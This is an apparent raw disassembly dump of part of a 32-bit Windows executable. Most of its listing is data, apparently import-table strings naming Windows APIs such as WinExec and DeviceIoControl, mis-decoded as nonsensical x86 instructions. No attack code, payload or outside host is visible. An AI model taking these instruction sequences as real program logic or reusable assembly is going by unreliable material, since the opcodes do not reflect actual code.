  41352e:	outs   dx,DWORD PTR ds:[esi]
  41352f:	imul   ebp,DWORD PTR [esi+0x74],0x573233
  413536:	jo     0x413538
  413538:	inc    ecx
  413539:	fs fs inc esi
  41353c:	outs   dx,DWORD PTR ds:[esi]
  41353d:	outs   dx,BYTE PTR ds:[esi]
  41353e:	je     0x413592
  413540:	gs jae 0x4135b2
  413543:	jne    0x4135b7
  413545:	arpl   WORD PTR [ebp+0x57],sp
  413548:	add    BYTE PTR [eax],al
  41354a:	inc    ecx
  41354b:	add    DWORD PTR [edi+0x65],eax
  41354e:	je     0x413594
  413550:	gs jbe 0x4135bc
  413553:	arpl   WORD PTR [ebp+0x43],sp
  413556:	popa   
  413557:	jo     0x4135cc
  413559:	add    BYTE PTR [esi+0x1],ch
  41355c:	inc    edi
  41355d:	gs je  0x4135b0
  413560:	imul   edi,DWORD PTR [eax+0x65],0xd500006c
  413567:	add    BYTE PTR [ebp+0x78],al
  41356a:	je     0x4135c0
  41356c:	gs js  0x4135e3
  41356f:	dec    edi
  413570:	jne    0x4135e6
  413572:	push   edi
  413573:	add    BYTE PTR [esi+0x65724300],ah
  413579:	popa   
  41357a:	je     0x4135e1
  41357c:	push   eax
  41357d:	popa   
  41357e:	je     0x4135f4
  413580:	gs jb  0x4135f1
  413583:	inc    edx
  413584:	jb     0x4135fb
  413586:	jae    0x4135f0
  413588:	add    BYTE PTR [eax],al
  41358a:	into   
  41358b:	add    BYTE PTR [ebp+0x78],al
  41358e:	arpl   WORD PTR [ebp+esi*2+0x64],bp
  413592:	gs inc ebx
  413594:	ins    BYTE PTR es:[edi],dx
  413595:	imul   esi,DWORD PTR [eax+0x52],0x746365
  41359c:	lds    eax,FWORD PTR [eax]
  41359e:	inc    ebp
  41359f:	outs   dx,BYTE PTR ds:[esi]
  4135a0:	jne    0x41360f
  4135a2:	inc    esi
  4135a3:	outs   dx,DWORD PTR ds:[esi]
  4135a4:	outs   dx,BYTE PTR ds:[esi]
  4135a5:	je     0x4135ed
  4135a7:	popa   
  4135a8:	ins    DWORD PTR es:[edi],dx
  4135a9:	imul   ebp,DWORD PTR [ecx+ebp*2+0x65],0x47005773
  4135b1:	inc    esp
  4135b2:	dec    ecx
  4135b3:	xor    esi,DWORD PTR [edx]
  4135b5:	cs fs ins BYTE PTR es:[edi],dx
  4135b8:	ins    BYTE PTR es:[edi],dx
  4135b9:	add    BYTE PTR [edi+0x74654701],bl
  4135bf:	inc    ebx
  4135c0:	outs   dx,DWORD PTR ds:[esi]
  4135c1:	ins    DWORD PTR es:[edi],dx
  4135c2:	jo     0x413639
  4135c4:	je     0x41362b
  4135c6:	jb     0x413616
  4135c8:	popa   
  4135c9:	ins    DWORD PTR es:[edi],dx
  4135ca:	gs inc ecx
  4135cc:	add    BYTE PTR [eax],al
  4135ce:	sbb    eax,0x74655304
  4135d3:	dec    eax
  4135d4:	popa   
  4135d5:	outs   dx,BYTE PTR ds:[esi]
  4135d6:	fs ins BYTE PTR es:[edi],dx
  4135d8:	gs inc ebx
  4135da:	outs   dx,DWORD PTR ds:[esi]
  4135db:	jne    0x41364b
  4135dd:	je     0x4135df
  4135df:	add    BYTE PTR [edx],bh
  4135e1:	add    ecx,DWORD PTR [edi+0x70]
  4135e4:	outs   dx,BYTE PTR gs:[esi]
  4135e6:	inc    esi
  4135e7:	imul   ebp,DWORD PTR [ebp+eiz*2+0x0],0x4300f200
  4135ef:	jb     0x413656
  4135f1:	popa   
  4135f2:	je     0x413659
  4135f4:	push   edi
  4135f5:	popa   
  4135f6:	imul   esi,DWORD PTR [ecx+eiz*2+0x62],0x6954656c
  4135fe:	ins    DWORD PTR es:[edi],dx
  4135ff:	gs jb  0x413643
  413602:	add    BYTE PTR [eax],al
  413604:	and    al,0x3
  413606:	dec    ebp
  413607:	popa   
  413608:	jo     0x413660
  41360a:	imul   esp,DWORD PTR [ebp+0x77],0x6946664f
  413611:	ins    BYTE PTR es:[edi],dx
  413612:	add    BYTE PTR gs:[esp+eax*1],bh
  413616:	push   ebx
  413617:	gs je  0x41366e
  41361a:	push   0x64616572
  41361f:	push   eax
  413620:	jb     0x41368b
  413622:	outs   dx,DWORD PTR ds:[esi]
  413623:	jb     0x41368e
  413625:	je     0x4136a0
  413627:	add    BYTE PTR [edx+0x6f6c4702],dl
  41362d:	bound  esp,QWORD PTR [ecx+0x6c]
  413630:	inc    edi
  413631:	gs je  0x413675
  413634:	je     0x4136a5
  413636:	ins    DWORD PTR es:[edi],dx
  413637:	dec    esi
  413638:	popa   
  413639:	ins    DWORD PTR es:[edi],dx
  41363a:	gs push edi
  41363c:	add    BYTE PTR [eax],al
  41363e:	retf   
  41363f:	add    cl,BYTE PTR [ecx+0x73]
  413642:	inc    edx
  413643:	popa   
  413644:	fs push edx
  413646:	gs popa 
  413648:	fs push eax
  41364a:	je     0x4136be
  41364c:	add    BYTE PTR [eax],al
  41364e:	or     BYTE PTR [ecx],al
  413650:	inc    esp
  413651:	gs jbe 0x4136bd
  413654:	arpl   WORD PTR [ebp+0x49],sp
  413657:	outs   dx,DWORD PTR ds:[esi]
  413658:	inc    ebx
  413659:	outs   dx,DWORD PTR ds:[esi]
  41365a:	outs   dx,BYTE PTR ds:[esi]
  41365b:	je     0x4136cf
  41365d:	outs   dx,DWORD PTR ds:[esi]
  41365e:	ins    BYTE PTR es:[edi],dx
  41365f:	add    BYTE PTR [ecx+0x1],bl
  413662:	inc    esi
  413663:	imul   ebp,DWORD PTR [esi+0x64],0x736f6c43
  41366a:	add    BYTE PTR gs:[edx],cl
  41366d:	add    al,BYTE PTR [edi+0x65]
  413670:	je     0x4136bf
  413672:	outs   dx,DWORD PTR ds:[esi]
  413673:	fs jne 0x4136e2
  413676:	gs dec eax
  413678:	popa   
  413679:	outs   dx,BYTE PTR ds:[esi]
  41367a:	fs ins BYTE PTR es:[edi],dx
  41367c:	gs inc ecx
  41367e:	add    BYTE PTR [eax],al
  413680:	inc    edx
  413681:	add    DWORD PTR [esi+0x69],eax
  413684:	outs   dx,BYTE PTR ds:[esi]
  413685:	fs dec esi
  413687:	gs js  0x4136fe
  41368a:	inc    ebx
  41368b:	push   0x65676e61
  413690:	dec    esi
  413691:	outs   dx,DWORD PTR ds:[esi]
  413692:	je     0x4136fd
  413694:	imul   sp,WORD PTR [ebx+0x61],0x6974
  41369a:	outs   dx,DWORD PTR ds:[esi]
  41369b:	outs   dx,BYTE PTR ds:[esi]
  41369c:	add    BYTE PTR [eax],al
  41369e:	xor    eax,0x74655304
  4136a3:	push   esp
  4136a4:	push   0x64616572
  4136a9:	inc    ecx
  4136aa:	data16 imul bp,WORD PTR [esi+0x69],0x7974
  4136b1:	dec    ebp
  4136b2:	popa   
  4136b3:	jae    0x413720
  4136b5:	add    BYTE PTR [esi],bl
  4136b7:	add    al,BYTE PTR [edi+0x65]
  4136ba:	je     0x41370c
  4136bc:	jb     0x413727
  4136be:	outs   dx,DWORD PTR ds:[esi]
  4136bf:	jb     0x41372a
  4136c1:	je     0x41373c
  4136c3:	inc    ebx
  4136c4:	ins    BYTE PTR es:[edi],dx
  4136c5:	popa   
  4136c6:	jae    0x41373b
  4136c8:	add    BYTE PTR [eax],al
  4136ca:	sti    
  4136cb:	add    DWORD PTR [edi+0x65],eax
  4136ce:	je     0x41371c
  4136d0:	popa   
  4136d1:	jae    0x413747
  4136d3:	inc    ebp
  4136d4:	jb     0x413748
  4136d6:	outs   dx,DWORD PTR ds:[esi]
  4136d7:	jb     0x4136d9
  4136d9:	add    BYTE PTR [edi],dl
  4136db:	add    ecx,DWORD PTR [edi+ebp*2+0x63]
  4136df:	imul   eax,DWORD PTR [esi+0x69],0x6c
  4136e3:	add    BYTE PTR gs:[eax],al
  4136e6:	retf   
  4136e7:	add    DWORD PTR [edi+0x65],eax
  4136ea:	je     0x41372f
  4136ec:	jne    0x413760
  4136ee:	jb     0x413755
  4136f0:	outs   dx,BYTE PTR ds:[esi]
  4136f1:	je     0x413737
  4136f3:	imul   esi,DWORD PTR [edx+0x65],0x726f7463
  4136fa:	jns    0x413753
  4136fc:	add    BYTE PTR [eax],al
  4136fe:	mov    BYTE PTR [eax],al
  413700:	inc    ecx
  413701:	jb     0x413768
  413703:	inc    esi
  413704:	imul   ebp,DWORD PTR [ebp+eiz*2+0x41],0x41736970
  41370c:	dec    esi
  41370d:	push   ebx
  41370e:	dec    ecx
  41370f:	add    BYTE PTR ds:0x74655304,ah
  413715:	dec    ebp
  413716:	popa   
  413717:	imul   ebp,DWORD PTR [ebx+esi*2+0x6c],0x6e49746f
  41371f:	outs   dx,WORD PTR ds:[esi]
  413721:	add    dl,cl
  413723:	add    BYTE PTR [ebx+0x72],al
  413726:	gs popa 
  413728:	je     0x41378f
  41372a:	inc    ebp
  41372b:	jbe    0x413792
  41372d:	outs   dx,BYTE PTR ds:[esi]
  41372e:	je     0x413771
  413730:	add    BYTE PTR [eax],al
  413732:	outs   dx,BYTE PTR ds:[esi]
  413733:	add    DWORD PTR [esi+0x69],eax
  413736:	outs   dx,BYTE PTR ds:[esi]
  413737:	fs push edx
  413739:	gs jae 0x4137ab
  41373c:	jne    0x4137b0
  41373e:	arpl   WORD PTR [ebp+0x45],sp
  413741:	js     0x41379a
  413743:	add    BYTE PTR [eax+0x3],bh
  413746:	push   edx
  413747:	gs popa 
  413749:	fs inc esi
  41374b:	imul   ebp,DWORD PTR [ebp+eiz*2+0x0],0x47026100
  413753:	gs je  0x4137aa
  413756:	gs ins DWORD PTR es:[edi],dx
  413758:	jo     0x4137aa
  41375a:	popa   
  41375b:	je     0x4137c5
  41375d:	inc    ecx
  41375e:	add    BYTE PTR [eax],al
  413760:	mov    DWORD PTR [edx],eax
  413762:	inc    edi
  413763:	ins    BYTE PTR es:[edi],dx
  413764:	outs   dx,DWORD PTR ds:[esi]
  413765:	bound  esp,QWORD PTR [ecx+0x6c]
  413768:	inc    ecx
  413769:	ins    BYTE PTR es:[edi],dx
  41376a:	ins    BYTE PTR es:[edi],dx
  41376b:	outs   dx,DWORD PTR ds:[esi]
  41376c:	arpl   WORD PTR [eax],ax
  41376e:	xchg   esp,eax
  41376f:	add    al,0x57
  413771:	imul   ebp,DWORD PTR [esi+0x45],0x636578
  413778:	bound  eax,QWORD PTR [edx]
  41377a:	inc    edi
  41377b:	gs je  0x4137d2
  41377e:	gs ins DWORD PTR es:[edi],dx
  413780:	jo     0x4137d2
  413782:	popa   
  413783:	je     0x4137ed
  413785:	push   edi
  413786:	add    BYTE PTR [eax],al
  413788:	rol    BYTE PTR [eax],1
  41378a:	inc    ebx
  41378b:	jb     0x4137f2
  41378d:	popa   
  41378e:	je     0x4137f5
  413790:	inc    esi
  413791:	imul   ebp,DWORD PTR [ebp+eiz*2+0x41],0x47026700
  413799:	gs je  0x4137f0
  41379c:	push   0x64616572
  4137a1:	dec    esp
  4137a2:	outs   dx,DWORD PTR ds:[esi]
  4137a3:	arpl   WORD PTR [ecx+0x6c],sp
  4137a6:	add    BYTE PTR gs:[eax],ah
  4137a9:	add    DWORD PTR [ebp+0x6e],eax
  4137ac:	jne    0x41381b
  4137ae:	push   edx
  4137af:	gs jae 0x413821
  4137b2:	jne    0x413826
  4137b4:	arpl   WORD PTR [ebp+0x4e],sp
  4137b7:	popa   
  4137b8:	ins    DWORD PTR es:[edi],dx
  4137b9:	gs jae 0x4137fd
  4137bc:	add    BYTE PTR [eax],al
  4137be:	repz add DWORD PTR [edi+0x65],eax
  4137c2:	je     0x41380a
  4137c4:	jne    0x413832
  4137c6:	ins    BYTE PTR es:[edi],dx
  4137c7:	push   eax
  4137c8:	popa   
  4137c9:	je     0x413833
  4137cb:	dec    esi
  4137cc:	popa   
  4137cd:	ins    DWORD PTR es:[edi],dx
  4137ce:	gs push edi
  4137d0:	add    BYTE PTR [eax],al
  4137d2:	push   eax
  4137d3:	add    DWORD PTR [esi+0x69],eax
  4137d6:	ins    BYTE PTR es:[edi],dx
  4137d7:	gs push esp
  4137d9:	imul   ebp,DWORD PTR [ebp+0x65],0x79536f54
  4137e0:	jae    0x413856
  4137e2:	gs ins DWORD PTR es:[edi],dx
  4137e4:	push   esp
  4137e5:	imul   ebp,DWORD PTR [ebp+0x65],0xe60000
  4137ec:	inc    ebx
  4137ed:	jb     0x413854
  4137ef:	popa   
  4137f0:	je     0x413857
  4137f2:	push   edx
  4137f3:	gs ins DWORD PTR es:[edi],dx
  4137f5:	outs   dx,DWORD PTR ds:[esi]
  4137f6:	je     0x41385d
  4137f8:	push   esp
  4137f9:	push   0x64616572
  4137fe:	add    BYTE PTR [eax],al
  413800:	jns    0x413804
  413802:	inc    edi
  413803:	gs je  0x41385c
  413806:	gs jb  0x41387c
  413809:	imul   ebp,DWORD PTR [edi+0x6e],0x1010000
  413810:	inc    esp
  413811:	gs ins BYTE PTR es:[edi],dx
  413813:	gs je  0x41387b
  413816:	inc    ebx
  413817:	jb     0x413882
  413819:	je     0x413884
  41381b:	arpl   WORD PTR [ecx+0x6c],sp
  41381e:	push   ebx
  41381f:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  413824:	outs   dx,BYTE PTR ds:[esi]
  413825:	add    BYTE PTR [ecx],cl
  413827:	add    al,BYTE PTR [edi+0x65]
  41382a:	je     0x413879
  41382c:	outs   dx,DWORD PTR ds:[esi]
  41382d:	fs jne 0x41389c
  413830:	gs inc esi
  413832:	imul   ebp,DWORD PTR [ebp+eiz*2+0x4e],0x57656d61
  41383a:	add    BYTE PTR [eax],al
  41383c:	dec    edi
  41383d:	add    al,0x53
  41383f:	jne    0x4138b4
  413841:	jo     0x4138a8
  413843:	outs   dx,BYTE PTR ds:[esi]
  413844:	fs push esp
  413846:	push   0x64616572
  41384b:	add    ah,cl
  41384d:	add    al,0x6c
  41384f:	jae    0x4138c5
  413851:	jb     0x4138b6
  413853:	jo     0x4138ce
  413855:	outs   dx,BYTE PTR ds:[esi]
  413856:	push   edi
  413857:	add    bh,dh
  413859:	add    DWORD PTR [edi+0x65],eax
  41385c:	je     0x4138a6
  41385e:	popa   
  41385f:	outs   dx,BYTE PTR ds:[esi]
  413860:	fs ins BYTE PTR es:[edi],dx
  413862:	gs dec ecx
  413864:	outs   dx,BYTE PTR ds:[esi]
  413865:	outs   dx,WORD PTR ds:[esi]
  413867:	jb     0x4138d6
  413869:	popa   
  41386a:	je     0x4138d5
  41386c:	outs   dx,DWORD PTR ds:[esi]
  41386d:	outs   dx,BYTE PTR ds:[esi]
  41386e:	add    BYTE PTR [eax],al
  413870:	or     eax,DWORD PTR [ebx]
  413872:	dec    esp
  413873:	outs   dx,DWORD PTR ds:[esi]
  413874:	arpl   WORD PTR [ecx+0x6c],sp
  413877:	inc    ecx
  413878:	ins    BYTE PTR es:[edi],dx
  413879:	ins    BYTE PTR es:[edi],dx
  41387a:	outs   dx,DWORD PTR ds:[esi]
  41387b:	arpl   WORD PTR [eax],ax
  41387d:	add    BYTE PTR [ebx+0x2],ah
  413880:	inc    edi
  413881:	gs je  0x4138d8
  413884:	push   0x64616572
  413889:	inc    ebx
  41388a:	outs   dx,DWORD PTR ds:[esi]
  41388b:	outs   dx,BYTE PTR ds:[esi]
  41388c:	je     0x4138f3
  41388e:	js     0x413904
  413890:	add    BYTE PTR [eax],al
  413892:	ret    
  413893:	add    edx,DWORD PTR [edx+0x74]
  413896:	ins    BYTE PTR es:[edi],dx
  413897:	push   ebp
  413898:	outs   dx,BYTE PTR ds:[esi]
  413899:	ja     0x413904
  41389b:	outs   dx,BYTE PTR ds:[esi]
  41389c:	add    BYTE PTR fs:[ecx+eax*1+0x41746547],cl
  4138a4:	je     0x413915
  4138a6:	ins    DWORD PTR es:[edi],dx
  4138a7:	dec    esi
  4138a8:	popa   
  4138a9:	ins    DWORD PTR es:[edi],dx
  4138aa:	gs push edi
  4138ac:	add    BYTE PTR [eax],al
  4138ae:	jmp    0x6946:0x74654701
  4138b5:	ins    BYTE PTR es:[edi],dx
  4138b6:	gs inc ecx
  4138b8:	je     0x41392e
  4138ba:	jb     0x413925
  4138bc:	bound  esi,QWORD PTR [ebp+0x74]
  4138bf:	gs jae 0x413907
  4138c2:	js     0x413905
  4138c4:	add    BYTE PTR [eax],al
  4138c6:	inc    edx
  4138c7:	add    al,BYTE PTR [edi+0x65]
  4138ca:	je     0x41391f
  4138cc:	push   0x5074726f
  4138d1:	popa   
  4138d2:	je     0x41393c
  4138d4:	dec    esi
  4138d5:	popa   
  4138d6:	ins    DWORD PTR es:[edi],dx
  4138d7:	gs inc ecx
  4138d9:	add    bl,bl
  4138db:	add    edx,DWORD PTR [ebx+0x65]
  4138de:	popa   
  4138df:	jb     0x413944
  4138e1:	push   0x68746150
  4138e6:	inc    ecx
  4138e7:	add    BYTE PTR [eax+0x4],al
  4138ea:	push   ebx
  4138eb:	gs je  0x413942
  4138ee:	imul   ebp,DWORD PTR [ebp+0x65],0x65755172
  4138f5:	jne    0x41395c
  4138f7:	push   esp
  4138f8:	imul   ebp,DWORD PTR [ebp+0x65],0xb4000072
  4138ff:	add    edx,DWORD PTR [edx+0x65]
  413902:	ins    DWORD PTR es:[edi],dx
  413903:	outs   dx,DWORD PTR ds:[esi]
  413904:	jbe    0x41396b
  413906:	inc    esp
  413907:	imul   esi,DWORD PTR [edx+0x65],0x726f7463
  41390e:	jns    0x413967
  413910:	add    BYTE PTR [eax],al
  413912:	ret    
  413913:	add    al,0x6c
  413915:	jae    0x41398b
  413917:	jb     0x41397c
  413919:	ins    DWORD PTR es:[edi],dx
  41391a:	jo     0x413973
  41391c:	add    BYTE PTR [eax],al
  41391e:	dec    edi
  41391f:	add    DWORD PTR [esi+0x69],eax
  413922:	ins    BYTE PTR es:[edi],dx
  413923:	gs push esp
  413925:	imul   ebp,DWORD PTR [ebp+0x65],0x6f4c6f54
  41392c:	arpl   WORD PTR [ecx+0x6c],sp
  41392f:	inc    esi
  413930:	imul   ebp,DWORD PTR [ebp+eiz*2+0x54],0x656d69
  413938:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413939:	add    BYTE PTR [ebx+0x61],al
  41393c:	outs   dx,BYTE PTR ds:[esi]
  41393d:	arpl   WORD PTR [ebp+0x6c],sp
  413940:	push   edi
  413941:	popa   
  413942:	imul   esi,DWORD PTR [ecx+eiz*2+0x62],0x6954656c
  41394a:	ins    DWORD PTR es:[edi],dx
  41394b:	gs jb  0x41394e
  41394e:	dec    ebx
  41394f:	inc    ebp
  413950:	push   edx
  413951:	dec    esi
  413952:	inc    ebp
  413953:	dec    esp
  413954:	xor    esi,DWORD PTR [edx]
  413956:	cs fs ins BYTE PTR es:[edi],dx
  413959:	ins    BYTE PTR es:[edi],dx
  41395a:	add    BYTE PTR [eax],al
  41395c:	inc    esi
  41395d:	add    BYTE PTR [eax+0x61],dl
  413960:	je     0x4139ca
  413962:	inc    esi
  413963:	imul   ebp,DWORD PTR [esi+0x64],0x65747845
  41396a:	outs   dx,BYTE PTR ds:[esi]
  41396b:	jae    0x4139d6
  41396d:	outs   dx,DWORD PTR ds:[esi]
  41396e:	outs   dx,BYTE PTR ds:[esi]
  41396f:	inc    ecx
  413970:	add    BYTE PTR [eax],al
  413972:	inc    edi
  413973:	add    BYTE PTR [eax+0x61],dl
  413976:	je     0x4139e0
  413978:	inc    esi
  413979:	imul   ebp,DWORD PTR [esi+0x64],0x65747845
  413980:	outs   dx,BYTE PTR ds:[esi]
  413981:	jae    0x4139ec
  413983:	outs   dx,DWORD PTR ds:[esi]
  413984:	outs   dx,BYTE PTR ds:[esi]
  413985:	push   edi
  413986:	add    BYTE PTR [eax],al
  413988:	push   ebx
  413989:	dec    eax
  41398a:	dec    esp
  41398b:	push   edi
  41398c:	inc    ecx
  41398d:	push   eax
  41398e:	dec    ecx
  41398f:	cs fs ins BYTE PTR es:[edi],dx
  413992:	ins    BYTE PTR es:[edi],dx
  413993:	add    BYTE PTR [ebx+0x46],dh
  413996:	addr16 popa 
  413998:	pop    ecx
  413999:	dec    ebp
  41399a:	popa   
  41399b:	jns    0x4139f1
  41399d:	push   ecx
  41399e:	imul   ebp,DWORD PTR [ebx+0x74],0x78
  4139a2:	je     0x413a05
  4139a4:	inc    ebx
  4139a5:	push   ecx
  4139a6:	ins    BYTE PTR es:[edi],dx
  4139a7:	pop    eax
  4139a8:	add    BYTE PTR [eax],al
  4139aa:	add    BYTE PTR [eax],al
  4139ac:	or     al,0x3e
  4139ae:	inc    ecx
  4139af:	add    BYTE PTR [esi+edi*1],dl
  4139b2:	inc    ecx
  4139b3:	add    ah,dh
  4139b5:	cmp    eax,DWORD PTR [ecx+0x0]
  4139b8:	call   0x794febc8
  4139bd:	dec    edi
  4139be:	ret    0x774e
  4139c1:	dec    edi
  4139c2:	cmp    eax,0x384f4f4f
  4139c7:	dec    edi
  4139c8:	jp     0x413a19
  4139ca:	cmp    ecx,DWORD PTR [edi+0x5e]
  4139cd:	dec    edi
  4139ce:	ss dec edi
  4139d0:	add    ecx,DWORD PTR [edi+0x31]
  4139d3:	dec    edi
  4139d4:	ret    0x324e
  4139d7:	dec    edi
  4139d8:	push   ds
  4139d9:	push   edx
  4139da:	pop    ds
  4139db:	push   ebx
  4139dc:	cmp    DWORD PTR [edi+0x79],ecx
  4139df:	dec    edi
  4139e0:	ret    0x774e
  4139e3:	dec    edi
  4139e4:	cmp    eax,0x384f4f4f
  4139e9:	dec    edi
  4139ea:	jp     0x413a3b
  4139ec:	cmp    ecx,DWORD PTR [edi+0x5e]
  4139ef:	dec    edi
  4139f0:	ss dec edi
  4139f2:	imul   ecx,DWORD PTR [edi+0x31],0x324ec24f
  4139f9:	dec    edi
  4139fa:	push   ds
  4139fb:	bound  ebx,QWORD PTR [edi]
  4139fd:	arpl   WORD PTR [ecx],di
  4139ff:	dec    edi
  413a00:	jns    0x413a51
  413a02:	ret    0x724e
  413a05:	dec    edi
  413a06:	cmp    eax,0x394f034f
  413a0b:	dec    edi
  413a0c:	dec    esp
  413a0d:	dec    edi
  413a0e:	xor    al,0x4f
  413a10:	ret    0x304e
  413a13:	dec    edi
  413a14:	push   ds
  413a15:	jb     0x413a36
  413a17:	jae    0x413a28
  413a19:	or     DWORD PTR [eax],0xffffff80
  413a1c:	js     0x4139ae
  413a1e:	jns    0x4139b1
  413a20:	aas    
  413a21:	dec    edi
  413a22:	jbe    0x413a73
  413a24:	ret    0x764e
  413a27:	dec    edi
  413a28:	ds dec edi
  413a2a:	dec    esp
  413a2b:	dec    edi
  413a2c:	cmp    DWORD PTR [edi+0x3],ecx
  413a2f:	dec    edi
  413a30:	xor    eax,0x364ec24f
  413a35:	dec    edi
  413a36:	push   ds
  413a37:	sbb    BYTE PTR [edi],0x83
  413a3a:	setae  BYTE PTR [eax]
  413a3d:	nop
  413a3e:	js     0x4139e0
  413a40:	jns    0x4139e3
  413a42:	aas    
  413a43:	dec    edi
  413a44:	jbe    0x413a95
  413a46:	ret    0x764e
  413a49:	dec    edi
  413a4a:	ds dec edi
  413a4c:	dec    esp
  413a4d:	dec    edi
  413a4e:	cmp    DWORD PTR [edi+0x69],ecx
  413a51:	dec    edi
  413a52:	xor    eax,0x364ec24f
  413a57:	dec    edi
  413a58:	push   ds
  413a59:	xchg   edx,eax
  413a5a:	pop    ds
  413a5b:	xchg   ebx,eax
  413a5c:	bt     DWORD PTR [eax],ecx
  413a5f:	mov    al,ds:0xb179b078
  413a64:	aas    
  413a65:	dec    edi
  413a66:	push   0x4e4ec24f
  413a6b:	dec    edi
  413a6c:	cmp    eax,0x394f034f
  413a71:	dec    edi
  413a72:	push   ecx
  413a73:	dec    edi
  413a74:	xor    al,0x4f
  413a76:	ret    0x364e
  413a79:	dec    edi
  413a7a:	push   ds
  413a7b:	mov    ds:0xb30fa31f,al
  413a80:	or     BYTE PTR [eax-0x3e863f88],dh
  413a86:	aas    
  413a87:	dec    edi
  413a88:	push   0x4e4ec24f
  413a8d:	dec    edi
  413a8e:	cmp    eax,0x394f784f
  413a93:	dec    edi
  413a94:	pop    edi
  413a95:	dec    edi
  413a96:	cmp    ecx,DWORD PTR [edi-0x3e]
  413a99:	dec    esi
  413a9a:	xor    eax,0x1fb21e4f
  413a9f:	mov    bl,0xf
  413aa1:	ret    
  413aa2:	or     al,al
  413aa4:	js     0x413a76
  413aa6:	jns    0x413a79
  413aa8:	aas    
  413aa9:	dec    edi
  413aaa:	push   0x4e4ec24f
  413aaf:	dec    edi
  413ab0:	cmp    eax,0x394f724f
  413ab5:	dec    edi
  413ab6:	dec    esi
  413ab7:	dec    edi
  413ab8:	xor    al,0x4f
  413aba:	ret    0x304e
  413abd:	dec    edi
  413abe:	push   ds
  413abf:	ret    0xc31f
  413ac2:	psrlq  mm1,QWORD PTR [eax]
  413ac5:	sar    BYTE PTR [eax-0x20],1
  413ac8:	jns    0x413aab
  413aca:	aas    
  413acb:	dec    edi
  413acc:	push   0x4e4ec24f
  413ad1:	dec    edi
  413ad2:	cmp    eax,0x394f734f
  413ad7:	dec    edi
  413ad8:	dec    esp
  413ad9:	dec    edi
  413ada:	xor    al,0x4f
  413adc:	ret    0x364e
  413adf:	dec    edi
  413ae0:	push   ds
  413ae1:	rcr    BYTE PTR [edi],cl
  413ae3:	ror    DWORD PTR [edi],cl
  413ae5:	jecxz  0x413aef
  413ae7:	loopne 0x413b61
  413ae9:	lock jns 0x413add
  413aec:	aas    
  413aed:	dec    edi
  413aee:	ins    DWORD PTR es:[edi],dx
  413aef:	dec    edi
  413af0:	ret    0x5f4e
  413af3:	dec    edi
  413af4:	cmp    eax,0x3e4f524f
  413af9:	dec    edi
  413afa:	ret    0x3f4e
  413afd:	dec    edi
  413afe:	push   ds
  413aff:	loop   0x413b20
  413b01:	jecxz  0x413b12
  413b03:	repz or al,dh
  413b06:	js     0x413b08
  413b08:	jns    0x413b0b
  413b0a:	js     0x413b1c
  413b0c:	jns    0x413b1f
  413b0e:	ds dec edi
  413b10:	jg     0x413b61
  413b12:	ret    0x5b4e
  413b15:	dec    edi
  413b16:	cmp    al,0x4f
  413b18:	jb     0x413b69
  413b1a:	ds dec edi
  413b1c:	dec    ebp
  413b1d:	dec    edi
  413b1e:	cmp    ecx,DWORD PTR [edi-0x3e]
  413b21:	dec    esi
  413b22:	xor    eax,0x1f021e4f
  413b27:	add    ecx,DWORD PTR [edi]
  413b29:	adc    ecx,DWORD PTR [eax]
  413b2b:	adc    BYTE PTR [eax+0x20],bh
  413b2e:	jns    0x413b51
  413b30:	aas    
  413b31:	dec    edi
  413b32:	add    BYTE PTR [eax],al
  413b34:	mov    esp,0xb0004139
  413b39:	cmp    eax,DWORD PTR [ecx+0x0]
  413b3c:	mov    eax,0x1800413b
  413b41:	ds inc ecx
  413b43:	add    BYTE PTR [ebp+edi*1+0x41],bh
  413b47:	add    BYTE PTR [eax],cl
  413b49:	ds inc ecx
  413b4b:	add    BYTE PTR [eax-0x63ffbec5],bl
  413b51:	cmp    eax,DWORD PTR [ecx+0x0]
  413b54:	add    BYTE PTR [esi],bh
  413b56:	inc    ecx
  413b57:	add    BYTE PTR [eax],al
  413b59:	cmp    al,0x41
  413b5b:	add    BYTE PTR [edx-0x4e076357],cl
  413b61:	mov    edx,0x3bb4f89c
  413b66:	inc    ecx
  413b67:	add    BYTE PTR [eax],bh
  413b69:	cmp    eax,0x3d4c0041
  413b6e:	inc    ecx
  413b6f:	add    BYTE PTR [eax+0x3d],bl
  413b72:	inc    ecx
  413b73:	add    BYTE PTR [eax+0x3d],ch
  413b76:	inc    ecx
  413b77:	add    ah,ch
  413b79:	cmp    eax,DWORD PTR [ecx+0x0]
  413b7c:	mov    eax,0xc004139
  413b81:	cmp    al,0x41
  413b83:	add    ah,bh
  413b85:	cmp    eax,DWORD PTR [ecx+0x0]
  413b88:	sbb    al,0x3e
  413b8a:	inc    ecx
  413b8b:	add    BYTE PTR [ecx],dh
  413b8d:	test   DWORD PTR [eax+edi*8-0x7ee8f462],ebx
  413b94:	sar    BYTE PTR [ebx],0x41
  413b97:	add    BYTE PTR [ebx-0x707ee9e4],dl
  413b9d:	or     eax,0x705
  413ba2:	inc    eax
  413ba3:	add    BYTE PTR [ebp+ebx*8-0x6c],al
  413ba7:	(bad)  
  413ba9:	xor    eax,0x68720043
  413bae:	inc    ebp
  413baf:	inc    ecx
  413bb0:	(bad)  
  413bb1:	cli    
  413bb2:	jne    0x413c16
  413bb4:	(bad)  
  413bb5:	in     eax,dx
  413bb6:	inc    BYTE PTR [edi]
  413bb8:	mov    eax,0xa805a3fa
  413bbd:	cmp    eax,DWORD PTR [ecx+0x0]
  413bc0:	xor    dl,BYTE PTR [ebp-0x69cd0764]
  413bc6:	pushf  
  413bc7:	clc    
  413bc8:	xor    edx,DWORD PTR [ebp-0x6ac30764]
  413bce:	pushf  
  413bcf:	clc    
  413bd0:	cmp    eax,0x3ef89c95
  413bd5:	xchg   ebp,eax
  413bd6:	pushf  
  413bd7:	clc    
  413bd8:	aas    
  413bd9:	xchg   ebp,eax
  413bda:	pushf  
  413bdb:	clc    
  413bdc:	cmp    BYTE PTR [ebp-0x6ac60764],dl
  413be2:	pushf  
  413be3:	clc    
  413be4:	cmp    dl,BYTE PTR [ebp-0x6ade0764]
  413bea:	pushf  
  413beb:	clc    
  413bec:	in     eax,dx
  413bed:	stc    
  413bee:	add    esp,DWORD PTR [eax-0x50]
  413bf1:	cmp    DWORD PTR [ecx+0x0],eax
  413bf4:	je     0x413bf6
  413bf6:	inc    ebx
  413bf7:	add    BYTE PTR [ecx+0x49],bl
  413bfa:	imul   si,WORD PTR [ecx],0xff85
  413bfe:	pushf  
  413bff:	clc    
  413c00:	sahf   
  413c01:	jmp    0x4f04356
  413c06:	add    BYTE PTR [eax],al
